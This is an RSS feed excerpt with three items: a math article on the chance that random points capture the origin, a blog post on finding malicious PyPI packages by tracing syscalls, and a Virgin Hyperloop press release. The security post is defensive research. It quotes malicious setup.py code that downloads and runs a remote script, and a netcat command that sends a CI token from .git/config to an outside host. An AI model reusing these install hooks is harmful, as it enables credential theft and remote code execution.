<span size="-1"></span> <br><span size="-1">2<i>j</i><sub>2</sub></span>&nbsp;<br></td><td nowrap="">
+ <span face="symbol">b</span><sub>3</sub></td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">3<i>j</i><sub>3</sub></span>&nbsp;<br></td><td nowrap="">
</td></tr></tbody></table>
</div></center>

 
(where each <span face="symbol">b</span><sub><i>i</i></sub>  <span face="symbol">³</span> 0 and <span face="symbol">b</span><sub>0</sub> + <span face="symbol">b</span><sub>1</sub> + <span face="symbol">b</span><sub>2</sub> +<span face="symbol">b</span><sub>3</sub> = 1), so the origin is contained in the tetrahedron
<i>P</i><sub>0</sub><i>P</i><sub>1<i>j</i><sub>1</sub></sub><i>P</i><sub>2<i>j</i><sub>2</sub></sub><i>P</i><sub>3<i>j</i><sub>3</sub></sub> if and only if the 4-tuple solving the
associated vector equation

<center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<span face="symbol">®</span><br>0</td><td nowrap="">
 = <i>w</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">0</span>&nbsp;<br></td><td nowrap="">
+ <i>x</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">1<i>j</i><sub>1</sub></span>&nbsp;<br></td><td nowrap="">
+ <i>y</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">2<i>j</i><sub>2</sub></span>&nbsp;<br></td><td nowrap="">
+ <i>z</i> </td><td nowrap="">
<span face="symbol">®</span><br><i>P</i></td><td nowrap="">
<span size="-1"></span> <br><span size="-1">3<i>j</i><sub>3</sub></span>&nbsp;<br></td><td nowrap="">
</td></tr></tbody></table>
</div></center>


consists of four coordinates of the same sign.  Since only one of the 
above eight solutions has this property, only one of the eight equally 
likely tetrahedra contains the origin, and hence the probability that the 
origin is contained in the randomly chosen tetrahedron is 1/8.

<h2><a name="tth_sEc2">
2</a>&nbsp;&nbsp;First Generalization</h2>

<p>
So far, so good.  This solution generalizes in the obvious way and gives us
the answer of 1/2<sup><i>n</i></sup> to question <b>(1)</b> in the above list.  But what of
question <b>(2)</b>?  The above approach seems inadequate in this case, since
points can now be chosen anywhere along the randomly chosen diameters.  

</p><p>
Let us employ one of the standard procedures when faced with a difficult
problem:  that of changing the problem to something easier.  We will
attempt first to answer question <b>(2)</b> in  <b><i>R</i></b><sup>2</sup>.  Specifically, if three
points are chosen at random from the unit disk <i>B</i><sup>2</sup>, what is the
probability that the triangle thus formed contains the origin? Let us
further simplify the problem by assuming that we are choosing three points
at random with respect to a probability measure <i>P</i> on <i>B</i><sup>2</sup> which is <i>
rotationally invariant </i>;  that is, measures of subsets of <i>B</i><sup>2</sup> are
unchanged under rotational translations.  We will also continue to assume
the appropriate degree of non-degeneracy of the measure (more on this in
the next section).

</p><p>
Since we are assuming rotational invariance, we can assume that the first
point <i>P</i><sub>1</sub> is fixed between 0 and 1 on the positive <i>x</i>-axis.  With
probability one, the second point <i>P</i><sub>2</sub> of the triangle is not located at
the origin, and we can form the ray starting at the origin and passing
through <i>P</i><sub>2</sub>.  Let <span face="symbol">q</span> be the angle between the positive <i>x</i>-axis and
this ray.  The question can now be posed as a conditional probability
problem:  given <span face="symbol">q</span>, what is the probability that the third point
<i>P</i><sub>3</sub> defines a triangle which contains the origin? Integrating this
probability over all possible <span face="symbol">q</span>'s will then give us the answer we
seek.

</p><p>
In order to simplify our work, let us agree upon some notation.  Given a
point <i>P</i> in <i>B</i><sup>2</sup> -{(0,0)}, let <span face="symbol">Q</span>(<i>P</i>) denote the angle from the
positive <i>x</i>-axis to the ray beginning at the origin and passing through
<i>P</i> (see Figure 2).  Thus, <span face="symbol">q</span><sub>1</sub>  <span face="symbol">£</span> <span face="symbol">Q</span>(<i>P</i>)  <span face="symbol">£</span> <span face="symbol">q</span><sub>2</sub> will
indicate that <i>P</i> lies in the sector of <i>B</i><sup>2</sup> defined by the angles
<span face="symbol">q</span><sub>1</sub> and <span face="symbol">q</span><sub>2</sub>.  Let <i>P</i>(capture) denote the probability
that the origin is captured within the triangle formed by the three points
<i>P</i><sub>1</sub>, <i>P</i><sub>2</sub> and <i>P</i><sub>3</sub>.  Thus, the first task is to calculate
<i>P</i>(capture&nbsp;<span face="symbol">|</span> &nbsp;<span face="symbol">Q</span>(<i>P</i><sub>2</sub>) = <span face="symbol">q</span>), for each <span face="symbol">q</span> <span face="symbol">Î</span> [0,2<span face="symbol">p</span>].

</p><center><img src="https://lsusmath.rickmabry.org/psisson/putnam/two.gif" width="300" height="300"></center>
 
<center>Figure 2: Illustration of <span face="symbol">Q</span>(<i>P</i><sub>2</sub>) for a typical <i>P</i><sub>2</sub>.</center>
 
<p>
Suppose first that 0  <span face="symbol">£</span> <span face="symbol">q</span> <span face="symbol">£</span> <span face="symbol">p</span>.  It is not difficult to see that
a necessary and sufficient condition for capture is that <span face="symbol">p</span> <span face="symbol">£</span> <span face="symbol">Q</span>(<i>P</i><sub>3</sub>)  <span face="symbol">£</span> <span face="symbol">p</span>+ <span face="symbol">q</span>.  That is, the ray from the origin to <i>P</i><sub>3</sub>
must pass through <i>S</i><sup>1</sup> (the boundary of <i>B</i><sup>2</sup>) at a point between <span face="symbol">p</span>
units and <span face="symbol">p</span>+ <span face="symbol">q</span> units, as measured from the positive <i>x</i>-axis.
Since the length of this arc is <span face="symbol">q</span>, this conditional probability is
<span face="symbol">q</span>/2<span face="symbol">p</span>, i.e. <i>P</i>(capture&nbsp;<span face="symbol">|</span> &nbsp;<span face="symbol">Q</span>(<i>P</i><sub>2</sub>) = <span face="symbol">q</span>) = <span face="symbol">q</span>/2<span face="symbol">p</span>.  Similarly, if <span face="symbol">p</span> <span face="symbol">£</span> <span face="symbol">q</span> <span face="symbol">£</span> 2<span face="symbol">p</span>, <i>P</i>(capture&nbsp;<span face="symbol">|</span> &nbsp;<span face="symbol">Q</span>(<i>P</i><sub>2</sub>) = <span face="symbol">q</span>) = 1 - <span face="symbol">q</span>/2<span face="symbol">p</span>.

</p><p>
We can now approximate our solution with an appropriate Riemann sum.  Let 
{ <span face="symbol">q</span><sub>0</sub>, <span face="symbol">¼</span>, <span face="symbol">q</span><sub><i>n</i></sub> } be a partition of [0,2<span face="symbol">p</span>].  Then

</p><center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<table>
<tbody><tr><td></td><td><table><tbody><tr><td nowrap="">
 <span face="symbol">»</span> </td><td nowrap="">
<span size="-1"><i>n</i>-1</span> <br><span face="symbol" size="+3">å<br></span>
<span size="-1"><i>i</i> = 0</span>&nbsp;<br></td><td nowrap="">
<i>P</i>(capture &nbsp;<span face="symbol">|</span> &nbsp;<span face="symbol">q</span><sub><i>i</i></sub>  <span face="symbol">£</span> <span face="symbol">Q</span>(<i>P</i><sub>2</sub>)  <span face="symbol">£</span> <span face="symbol">q</span><sub><i>i</i>+1</sub>) &nbsp;<i>P</i>(<span face="symbol">q</span><sub><i>i</i></sub>  <span face="symbol">£</span> <span face="symbol">Q</span>(<i>P</i><sub>2</sub>) <span face="symbol">£</span> <span face="symbol">q</span><sub><i>i</i>+1</sub>)  </td></tr></tbody></table></td>
</tr><tr><td></td><td><table><tbody><tr><td nowrap="">
 = </td><td nowrap="">
<span size="-1"><i>n</i>-1</span> <br><span face="symbol" size="+3">å<br></span>
<span size="-1"><i>i</i> = 0</span>&nbsp;<br></td><td nowrap="">
<i>P</i>(capture &nbsp;<span face="symbol">|</span> &nbsp;<span face="symbol">q</span><sub><i>i</i></sub>  <span face="symbol">£</span> <span face="symbol">Q</span>(<i>P</i><sub>2</sub>)  <span face="symbol">£</span> <span face="symbol">q</span><sub><i>i</i>+1</sub>) &nbsp;</td><td nowrap="">
<span face="symbol">D</span><span face="symbol">q</span><sub><i>i</i></sub><hr noshade="">2<span face="symbol">p</span><br></td><td nowrap="">
.</td></tr></tbody></table></td></tr></tbody></table>
</td><td nowrap="">
</td></tr></tbody></table>
</div></center>



<p>
In the limit of finer and finer partitions, we obtain

</p><center><div>
<table><tbody><tr><td nowrap="">
</td><td nowrap="">
<table>
<tbody><tr><td></td><td><table><tbody><tr><td nowrap="">
 = </td><td><span face="symbol">
ó<br>õ
</span></td><td nowrap="">
<span size="-1">2<span face="symbol">p</span></span> <span size="-1">0</span>&nbsp;<br></td><td nowrap="">
<i>P</i>(capture &nbsp;<span face="symbol">|</span> &nbsp;<span face="symbol">Q</span>(<i>P</i><sub>2</sub>) = <span face="symbol">q</span>) &nbsp;</td><td nowrap="">
<i>d</i><span face="symbol">q</span><hr noshade="">2<span face="symbol">p</span><br></td><td nowrap="">
 </td></tr></tbody></table></td>
</tr><tr><td></td><td><table><tbody><tr><td nowrap="">
 = </td><td><span face="symbol">
ó<br>õ
</span></td><td nowrap="">
<span size="-1"><span face="symbol">p</span></span> <span size="-1">0</span>&nbsp;<br></td><td nowrap="">
</td><td nowrap="">
<span face="symbol">q</span><hr noshade="">2<span face="symbol">p</span><br></td><td nowrap="">
&nbsp; </td><td nowrap="">
<i>d</i><span face="symbol">q</span><hr noshade="">2<span face="symbol">p</span><br></td><td nowrap="">
+ </td><td><span face="symbol">
ó<br>õ
</span></td><td nowrap="">
<span size="-1">2<span face="symbol">p</span></span> <span size="-1"><span face="symbol">p</span></span>&nbsp;<br></td><td nowrap="">
</td><td><span face="symbol">
æ<br>ç<br>
è
</span></td><td nowrap="">
1 - </td><td nowrap="">
<span face="symbol">q</span><hr noshade="">2<span face="symbol">p</span><br></td><td><span face="symbol">
ö<br>÷<br>
ø
</span></td><td nowrap="">
&nbsp;</td><td nowrap="">
<i>d</i><span face="symbol">q</span><hr noshade="">2<span face="symbol">p</span><br></td><td nowrap="">
 </td></tr></tbody></table></td>
</tr><tr><td></td><td></td></tr></tbody></table>
</td><td nowrap="">
</td></tr></tbody></table>
</div></center>



<p>
Examination of this argument shows that we have answered more than we set
out to, since the fact that <i>P</i> is a probability measure on <i>B</i><sup>2</sup> is really
irrelevant.  As long as <i>P</i> is a probability measure on  <b><i>R</i></b><sup>2</sup> which is
rotationally invariant and suitably non-degenerate, the result is the same.
We are already aware of one consequence of this:  if <i>P</i> is a uniformly
distributed probability measure on <i>S</i><sup>1</sup>, the method of Klosinski,
Alexanderson and Larson tells us that with probability 1/4 the origin
will be contained in a randomly chosen triangle.  We can also begin to make
sense of question <b>(4)</b> by noting that if <i>P</i> is the usual Gaussian
probability measure on all of  <b><i>R</i></b><sup>2</sup>, the probability that three randomly
chosen points captures the origin is again 1/4.

</p><p>
A related problem in geometric probability, whose many variants are dealt
with in [<a href="#hall" name="CITEhall">1</a>], [<a href="#kendalls" name="CITEkendalls">2</a>], [<a href="#lang1" name="CITElang1">4</a>], [<a href="#lang2" name="CITElang2">5</a>] and
[<a href="#san" name="CITEsan">6</a>], is to find the probability that three points chosen at random
from a region in the plane will form an acute triangle.  One version can be
easily answered here.  Since the origin is captured by three points chosen
at random from the unit circle if and only if the three points form an
acute triangle, the probability that an acute triangle is formed by three
points chosen at random from <i>S</i><sup>1</sup> is also 1/4.

</p><p>
The results above suggest that under rather general circumstances <i>n</i>+1
points chosen randomly from a region in  <b><i>R</i></b><sup><i>n</i></sup> which is symmetric with
respect to the origin will capture the origin with probability 1/2<sup><i>n</i></sup>. Our
main result gives conditions which guarantee the …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lsusmath.rickmabry.org/psisson/putnam/putnam-web.htm">https://lsusmath.rickmabry.org/psisson/putnam/putnam-web.htm</a></em></p>]]>
            </description>
            <link>https://lsusmath.rickmabry.org/psisson/putnam/putnam-web.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070681</guid>
            <pubDate>Thu, 12 Nov 2020 15:11:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hunting for Malicious Packages on PyPI]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25070672">thread link</a>) | @jwcrux
<br/>
November 12, 2020 | https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/ | <a href="https://web.archive.org/web/*/https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
<article>

<section>
<p><img src="https://jordan-wright.com/blog/images/headers/svg/ossmalware.svg" alt="">
<br>
About a year ago, the Python Software Foundation <a href="https://discuss.python.org/t/what-methods-should-we-implement-to-detect-malicious-content/2240">opened a Request for Information (RFI)</a> to discuss how we could detect malicious packages being uploaded to PyPI. Whether it’s <a href="https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm">taking over abandoned packages</a>, <a href="https://github.com/dateutil/dateutil/issues/984">typosquatting on popular libraries</a>, or <a href="https://github.com/ChALkeR/notes/blob/master/Gathering-weak-npm-credentials.md">hijacking packages using credential stuffing</a>, it’s clear this is a real issue affecting nearly every package manager.</p>

<p>The truth is that package managers like PyPI are critical infrastructure that almost every company relies on. I could write for days on this topic, but I’ll just let this xkcd suffice for now.</p>
<p><a href="https://xkcd.com/2347/"><img src="https://imgs.xkcd.com/comics/dependency.png" alt="">
</a></p>
<p>This is an area of interest for me, so I responded with <a href="https://gist.github.com/jordan-wright/dfe6236cb4d084aba282239fa9679bc8">my thoughts</a> on how we could approach this. While the entire post is well-cited, beautiful prose that you should go read, one thing stuck with me: considering what happens as soon as a package is installed.</p>
<p>While it might be necessary for some setup activities, things like establishing network connections or executing commands during the <code>pip install</code> process should always be viewed with a 🤨, since it doesn’t give the developer much of a chance to inspect the code before bad things happen.</p>
<p>I wanted to explore this further, so in this post I’m going to walk through how I installed and analyzed every package in PyPI looking for malicious activity.</p>
<h2 id="how-to-find-malicious-libraries">How to Find Malicious Libraries</h2>
<p>To run arbitrary commands during installation, authors typically add code to the <code>setup.py</code> file in their package. You can see some examples in <a href="https://github.com/rsc-dev/pypi_malware/tree/master/malware">this repository</a>.</p>
<p>At a high-level, there are two things you can do to find potentially malicious dependencies: you can look through the code for bad things (static analysis), or you can live dangerously and just install them to see what happens (dynamic analysis).</p>
<p>While static analysis is super interesting (heck, I <a href="https://duo.com/decipher/hunting-malicious-npm-packages">found malicious packages on npm</a> using artisanal <code>grep</code>ing), for this post I’ll focus on dynamic analysis. After all, I think it’s a bit more robust since you’re looking at what <em>actually</em> happens instead of just looking for bad things that could happen.</p>
<p>So what is it we’re actually looking for?</p>
<h3 id="how-important-things-get-done">How Important Things Get Done</h3>
<p>Generally, anytime something important happens it’s done by the kernel. Normal programs (like <code>pip</code>) that want to do important things through the kernel do so through the use of <em>syscalls</em>. Opening files, establishing network connections, and executing commands are all done using syscalls!</p>
<p>You can find more information in this comic from <a href="https://twitter.com/b0rk">Julia Evans</a>:</p>
<blockquote><p lang="en" dir="ltr">system calls <a href="https://t.co/hL91dqbFyq">pic.twitter.com/hL91dqbFyq</a></p>— 🔎Julia Evans🔍 (@b0rk) <a href="https://twitter.com/b0rk/status/989011990092963840?ref_src=twsrc%5Etfw">April 25, 2018</a></blockquote>

<p>This means that if we can watch syscalls during the installation of a Python package, we can see if anything suspicious occurs. The benefit is that it doesn’t matter how obfuscated the code is- we’ll see what actually happens.</p>
<p>It’s important to note that the idea of watching syscalls isn’t something I came up with. Folks like <a href="https://twitter.com/adam_baldwin">Adam Baldwin</a> have been talking about this <a href="https://www.slideshare.net/evilpacket/hunting-for-malicious-modules-in-npm-nodesummit">since 2017</a>. And there was an <a href="https://arxiv.org/pdf/2002.01139.pdf">excellent paper</a> published by researchers from the Georgia Institute of Technology that took this same approach, among others. Honestly, most of this blog post is just trying to reproduce their work.</p>
<p>So we know we want to monitor syscalls - how exactly do we do that?</p>
<h3 id="watching-syscalls-with-sysdig">Watching Syscalls with Sysdig</h3>
<p>There are a number of tools designed to let you watch syscalls. For this project I used <a href="https://github.com/draios/sysdig">sysdig</a> since it provides both structured output and some really nice filtering capabilities.</p>
<p>To make this work, when starting the Docker container that installs the package, I also started a sysdig process that only monitors events from that container. I also filtered out network reads/writes that are going to/from <code>pypi.org</code> or <code>files.pythonhosted.com</code> since I didn’t want to fill the logs with traffic related to package downloads.</p>
<p>With a way to capture syscalls, I had to solve another problem: how to get a list of all PyPI packages.</p>
<h2 id="getting-python-packages">Getting Python Packages</h2>
<p>Fortunately for us, PyPI has an API called the <a href="https://www.python.org/dev/peps/pep-0503/">“Simple API”</a> that can also be thought of as “a very big HTML page with a link to every package” since that’s what it is. It’s simple, clean, and better than any HTML I can probably write.</p>
<p>We can grab this page and parse out all the links using <code>pup</code>, giving us right around 268,000 packages:</p>
<div><pre><code data-lang="text">❯ curl https://pypi.org/simple/ | pup 'a text{}' &gt; pypi_full.txt               

❯ wc -l pypi_full.txt 
  268038 pypi_full.txt</code></pre></div>
<p>For this experiment, I’ll only care about the latest release of each package. It’s possible that there’s malicious versions of packages buried in older releases, but the AWS bill isn’t going to pay itself.</p>
<p>I ended up with a pipeline that looked something like this:</p>

<p>In a nutshell, we’re sending each package name to a set of EC2 instances (I’d love to use Fargate or something in the future but I also don’t know Fargate, so…) which fetches some metadata about the package from PyPI, then starts sysdig as well as a series of containers to <code>pip install</code> the package while syscalls and network traffic were being collected. Then, all of the data is shipped up to S3 for future-Jordan to worry about.</p>
<p>Here’s what this process looks like:</p>

<h2 id="the-results">The Results</h2>
<p>Once this was complete, I had about a terabyte of data sitting in an S3 bucket covering around 245,000 packages. A few packages didn’t have a published version, and some had various processing errors but this felt like a great sample set to work from.</p>
<p>Now for the fun part: <strike>a crapton of grep</strike> ✨ <strong>analysis</strong> ✨.</p>
<p>I merged the metadata and the output, giving me a series of JSON files that looked like this:</p>
<div><pre><code data-lang="json"><span>{</span>
    <span>"metadata"</span><span>:</span> <span>{},</span>
    <span>"output"</span><span>:</span> <span>{</span>
        <span>"dns"</span><span>:</span> <span>[],</span>         <span>//</span> <span>Any</span> <span>DNS</span> <span>requests</span> <span>made</span>
        <span>"files"</span><span>:</span> <span>[],</span>       <span>//</span> <span>All</span> <span>file</span> <span>access</span> <span>operations</span>
        <span>"connections"</span><span>:</span> <span>[],</span> <span>//</span> <span>TCP</span> <span>connections</span> <span>established</span>
        <span>"commands"</span><span>:</span> <span>[],</span>    <span>//</span> <span>Any</span> <span>commands</span> <span>executed</span>
    <span>}</span>
<span>}</span></code></pre></div>
<p>I then wrote a series of scripts to start aggregating the data, trying to get a sense of what’s benign and what’s malicious. Let’s dig into some of the results.</p>
<h3 id="network-requests">Network Requests</h3>
<p>There are a number of reasons why a package would need to make a network connection during the installation process. They might need to download legitimate binary components or other resources, they might be a form of analytics, or they may be trying to exfiltrate data or credentials from the system.</p>
<p>The results found 460 packages making network connections to 109 unique hosts. Just like the paper above mentions, quite a few of these are the result of packages sharing a dependency that makes the network connection. It’s possible to filter these out by mapping dependencies, but I haven’t done that here.</p>
<p>For more information, <a href="https://gist.github.com/jordan-wright/c8b273372368ee639dec46b08a93bce1">here’s</a> a breakdown of DNS requests seen during installation.</p>
<h3 id="command-execution">Command Execution</h3>
<p>Like network connections, there are legitimate reasons for packages to run system commands during installation. This could be to compile native binaries, setup the right environment, and more.</p>
<p>Looking across our sample set, 60,725 packages are found to be executing commands during installation. And just like network connections, we have to keep in mind that many of these will be the result of a downstream dependency being the package that runs the commands.</p>
<h2 id="interesting-packages">Interesting Packages</h2>
<p>Digging into the results, most network connections and commands appeared to be legitimate, as expected. But there were a few instances of odd behavior I wanted to call out as case studies to show how useful this type of analysis can be.</p>
<h3 id="i-am-malicious"><code>i-am-malicious</code></h3>
<p>One package called <code>i-am-malicious</code> appears to be a proof-of-concept of a malicious package. Here are the interesting details that give us an idea that the package is worth investigating (if the name weren’t enough 😉):</p>
<div><pre><code data-lang="json"><span>{</span>
  <span>"dns"</span><span>:</span> <span>[{</span>
          <span>"name"</span><span>:</span> <span>"gist.githubusercontent.com"</span><span>,</span>
          <span>"addresses"</span><span>:</span> <span>[</span>
            <span>"199.232.64.133"</span>
          <span>]</span>
    <span>}]</span>
  <span>]</span><span>,</span>
  <span>"files"</span><span>:</span> <span>[</span>
    <span>...</span>
    <span>{</span>
      <span>"filename"</span><span>:</span> <span>"/tmp/malicious.py"</span><span>,</span>
      <span>"flag"</span><span>:</span> <span>"O_RDONLY|O_CLOEXEC"</span>
    <span>},</span>
    <span>...</span>
    <span>{</span>
      <span>"filename"</span><span>:</span> <span>"/tmp/malicious-was-here"</span><span>,</span>
      <span>"flag"</span><span>:</span> <span>"O_TRUNC|O_CREAT|O_WRONLY|O_CLOEXEC"</span>
    <span>},</span>
    <span>...</span>
  <span>],</span>
  <span>"commands"</span><span>:</span> <span>[</span>
    <span>"python /tmp/malicious.py"</span>
  <span>]</span>
<span>}</span></code></pre></div>
<p>We can already get some sense of what’s happening here. We see a connection made to <code>gist.github.com</code>, a Python file being executed, and a file named <code>/tmp/malicious-was-here</code> being created. Sure enough, that’s exactly what’s happening in the <code>setup.py</code>:</p>
<div><pre><code data-lang="python"><span>from</span> <span>urllib.request</span> <span>import</span> <span>urlopen</span>

<span>handler</span> <span>=</span> <span>urlopen</span><span>(</span><span>"https://gist.githubusercontent.com/moser/49e6c40421a9c16a114bed73c51d899d/raw/fcdff7e08f5234a726865bb3e02a3cc473cecda7/malicious.py"</span><span>)</span>
<span>with</span> <span>open</span><span>(</span><span>"/tmp/malicious.py"</span><span>,</span> <span>"wb"</span><span>)</span> <span>as</span> <span>fp</span><span>:</span>
    <span>fp</span><span>.</span><span>write</span><span>(</span><span>handler</span><span>.</span><span>read</span><span>())</span>

<span>import</span> <span>subprocess</span>

<span>subprocess</span><span>.</span><span>call</span><span>([</span><span>"python"</span><span>,</span> <span>"/tmp/malicious.py"</span><span>])</span></code></pre></div>
<p>The <a href="https://gist.githubusercontent.com/moser/49e6c40421a9c16a114bed73c51d899d/raw/fcdff7e08f5234a726865bb3e02a3cc473cecda7/malicious.py"><code>malicious.py</code></a> in question simply adds an “I was here” type message to <code>/tmp/malicious-was-here</code>, suggesting this is indeed a proof-of concept.</p>
<h3 id="maliciouspackage"><code>maliciouspackage</code></h3>
<p>Another self-proclaimed malicious package creatively named <code>maliciouspackage</code> is a bit more nefarious. Here’s the relevant output:</p>
<div><pre><code data-lang="json"><span>{</span>
  <span>"dns"</span><span>:</span> <span>[{</span>
      <span>"name"</span><span>:</span> <span>"laforge.xyz"</span><span>,</span>
      <span>"addresses"</span><span>:</span> <span>[</span>
        <span>"34.82.112.63"</span>
      <span>]</span>
  <span>}],</span>
  <span>"files"</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>"filename"</span><span>:</span> <span>"/app/.git/config"</span><span>,</span>
      <span>"flag"</span><span>:</span> <span>"O_RDONLY"</span>
    <span>},</span>
  <span>],</span>
  <span>"commands"</span><span>:</span> <span>[</span>
    <span>"sh -c apt install -y socat"</span><span>,</span>
    <span>"sh -c grep ci-token /app/.git/config | nc laforge.xyz 5566"</span><span>,</span>
    <span>"grep ci-token /app/.git/config"</span><span>,</span>
    <span>"nc laforge.xyz 5566"</span>
  <span>]</span>
<span>}</span></code></pre></div>
<p>As before, our output gives us a decent idea of what’s going on. In this case, the package appears to extract out a token from the <code>.git/config</code> file and upload it to <code>laforge.xyz</code>. Looking through the <code>setup.py</code>, we see that’s exactly what’s happening:</p>
<div><pre><code data-lang="python"><span>...</span>
<span>import</span> <span>os</span>
<span>os</span><span>.</span><span>system</span><span>(</span><span>'apt install -y socat'</span><span>)</span>
<span>os</span><span>.</span><span>system</span><span>(</span><span>'grep ci-token /app/.git/config | nc laforge.xyz 5566'</span><span>)</span></code></pre></div>
<h3 id="easyioctl"><code>easyIoCtl</code></h3>
<p>The package <code>easyIoCtl</code> is an interesting one. It claims to give “abstractions away from boring IO operations” but we see the following commands being executed:</p>
<div><pre><code data-lang="bash"><span>[</span>
  <span>"sh -c touch /tmp/testing123"</span>,
  <span>"touch /tmp/testing123"</span>
<span>]</span></code></pre></div>
<p>Suspicious, but not actively harmful. However, this is a <em>perfect</em> example showing the power of tracing syscalls. Here is the relevant code in …</p></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/">https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/</a></em></p>]]>
            </description>
            <link>https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070672</guid>
            <pubDate>Thu, 12 Nov 2020 15:10:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[First Passengers Travel Safely on a Hyperloop]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25070618">thread link</a>) | @hliyan
<br/>
November 12, 2020 | https://virginhyperloop.com/press/first-passenger-testing | <a href="https://web.archive.org/web/*/https://virginhyperloop.com/press/first-passenger-testing">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

										
					<div><ul><br>
<li>Josh Giegel, CTO and Co-Founder, and Sara Luchian, Director of Passenger Experience, ride the first new form of transportation in over a century</li><br>
</ul>
<p>LAS VEGAS, NEVADA – November 8, 2020 – Transportation history was made today in the Nevada desert, where Virgin Hyperloop tested human travel in a hyperloop pod for the first time. </p>
<p>“For the past few years, the Virgin Hyperloop team has been working on turning its ground breaking technology into reality,” said <strong>Sir Richard Branson, Founder of the Virgin Group</strong>. “With today’s successful test, we have shown that this spirit of innovation will in fact change the way people everywhere live, work, and travel in the years to come.”</p>
<p>Josh Giegel, Co-Founder and Chief Technology Officer, and Sara Luchian, Director of Passenger Experience, were the first people in the world to ride on this new form of transportation. The test took place at Virgin Hyperloop’s 500 meter DevLoop test site in Las Vegas, where the company has previously run over 400 un-occupied tests. </p>
<p>“When we started in a garage over 6 years ago, the goal was simple – to transform the way people move,” said <strong>Josh Giegel, Co-Founder and Chief Technology Officer of Virgin Hyperloop</strong>. “Today, we took one giant leap toward that ultimate dream, not only for me, but for all of us who are looking towards a moonshot right here on Earth.”</p>
<p>The occupants made their maiden voyage on the newly-unveiled XP-2 vehicle, designed by BIG – <a href="https://big.dk/">Bjarke Ingels Group</a> and <a href="https://kilodesign.dk/">Kilo Design</a>, which was custom-built with occupant safety and comfort in mind. While the production vehicle will be larger and seat up to 28 passengers, this 2-seater XP-2 vehicle was built to demonstrate that passengers can in fact safely travel in a hyperloop vehicle. </p>
<p>“Hyperloop is about so much more than the technology. It’s about what it enables,” said <strong>Sara Luchian, Director of Passenger Experience for Virgin Hyperloop</strong>. “To me, the passenger experience ties it all together. And what better way to design the future than to actually experience it first-hand?”</p>
<p>Sultan Ahmed Bin Sulayem, Chairman of Virgin Hyperloop, watched this historic passenger testing first-hand. </p>
<p>“I had the true pleasure of seeing history made before my very eyes – to witness the first new mode of mass transportation in over 100 years come to life,” said <strong>Sultan Ahmed Bin Sulayem, Chairman of Virgin Hyperloop and Group Chairman and CEO of DP World</strong>. “I have always had tremendous faith in the team at Virgin Hyperloop to transform this technology into a safe system, and today we have done that. We are one step closer to ushering in a new era of ultra-fast, sustainable movement of people and goods.”</p>
<p>The testing campaign, from the beginning stages all the way through to today’s successful demonstration, was overseen by the industry-recognized Independent Safety Assessor (ISA) <a href="https://www.certifer.fr/en/homepage">Certifer</a>. Having undergone a rigorous and exhaustive safety process, the XP-2 vehicle demonstrates many of the safety-critical systems that will be found on a commercial hyperloop system and is equipped with a state-of-the-art control system that can detect off-nominal states and rapidly trigger appropriate emergency responses.</p>
<p>“I can’t tell you how often I get asked ‘is hyperloop safe?,’” said <strong>Jay Walder, CEO of Virgin Hyperloop</strong>. “With today’s passenger testing, we have successfully answered this question, demonstrating that not only can Virgin Hyperloop safely put a person in a pod in a vacuum environment, but that the company has a thoughtful approach to safety which has been validated by an independent third party.” </p>
<p>This announcement builds off of significant momentum on the regulatory front. Just last month, Virgin Hyperloop <a href="https://virginhyperloop.com/press/west-virginia-hcc">unveiled West Virginia as the location for the Hyperloop Certification Center (HCC)</a>. In July 2020, the US Department of Transportation (USDOT) Secretary Elaine Chao and the Non-Traditional and Emerging Transportation Technology (NETT) Council unveiled the <a href="https://virginhyperloop.com/press/guidance-document-regulation">guidance document</a> on a clear regulatory framework for hyperloop in the United States. This historic announcement not only provides a pathway for hyperloop regulation and deployment in the US, but also establishes hyperloop’s eligibility for federal funding for projects.</p>
<p>This federal momentum, combined with the advancements at the HCC and the historic safety demonstration achieved with this test will pave the way for the certification of hyperloop systems around the world – a key step towards commercial projects.</p><br>
<h3>Media Assets</h3>
<p>Media assets can be found <a href="https://www.dropbox.com/sh/nm689gycztpn66n/AADgE6pJQeJtXcd6225sSulDa?dl=0">here</a>. Please credit Virgin Hyperloop.</p><br>


												<h2>About Virgin Hyperloop</h2>
<p>Virgin Hyperloop is the only company in the world that has successfully tested hyperloop technology at scale, launching the first new mode of mass transportation in over 100 years. The company successfully operated a full-scale hyperloop vehicle using electric propulsion and electromagnetic levitation under near-vacuum conditions, realizing a fundamentally new form of transportation that is faster, safer, cheaper, and more sustainable than existing modes. The company is now working with governments, partners, and investors around the world to make hyperloop a reality in years, not decades. Learn more about Virgin Hyperloop's technology, vision, and ongoing projects <a href="https://virginhyperloop.com/">here</a>.</p><br>


							
							
							<h2>Media Contacts</h2>
<p><strong>Virgin Hyperloop</strong> <br>
Ryan Kelly <br>
Vice President of Marketing and Communications <br>
press@virginhyperloop.com<br>
